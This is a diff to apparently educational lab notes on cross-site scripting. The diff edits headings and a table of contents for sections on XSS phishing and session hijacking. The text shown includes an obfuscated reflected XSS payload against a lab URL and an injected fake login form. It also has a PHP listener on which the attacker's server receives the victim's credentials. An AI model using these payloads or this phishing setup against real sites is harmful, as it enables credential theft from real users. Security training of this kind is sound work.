@@ -12,6 +12,8 @@ This document summarizes core techniques for identifying and exploiting **Cross-
   - [Reflected XSS](#reflected-xss)
   - [DOM XSS](#dom-xss)
   - [Automated XSS Discovery](#automated-xss-discovery)
+  - [XSS Attacks - Phishing](#xss-attacks---phishing)
+  - [XSS Attacks - Session Hijacking](#xss-attacks---session-hijacking)
 
 ---
 
@@ -260,7 +262,7 @@ In this case, XSStrike identified a reflected XSS vulnerability in the email par
 
 ---
 
-## XSS Phishing Attacks
+## XSS Attacks - Phishing
 
 Phishing attacks rely on presenting **deceptive but legitimate-looking content** to trick victims into disclosing sensitive information, such as usernames and passwords. When combined with XSS vulnerabilities, phishing becomes particularly effective, as the malicious content is executed within the trusted context of the vulnerable application.
 
@@ -285,10 +287,6 @@ python xsstrike.py -u "http://10.129.133.125/phishing/index.php?url=test"
 `XSStrike` dentifies several working payloads. We begin by testing the following reflected payload:
 
 ```bash
-# Payload
-'><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()>v3dm0s
-
-# Example
 http://10.129.133.125/phishing/index.php?url='><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()>v3dm0s
 ```
 
@@ -330,7 +328,6 @@ document.write('<minimized login form HTML>')
 Injected via the confirmed vector:
 
 ```javascript
-// Payload
 0doNpoINtEreNTEr%0d=%0dconfirm()>document.write('minimized code goes here')
 ```
 
@@ -359,3 +356,5 @@ sudo php -S 0.0.0.0:8001
 When the victim submits the fake login form, their credentials are sent directly to the attacker-controlled server, completing the phishing attack.
 
 ---
+
+## XSS Attacks - Session Hijacking
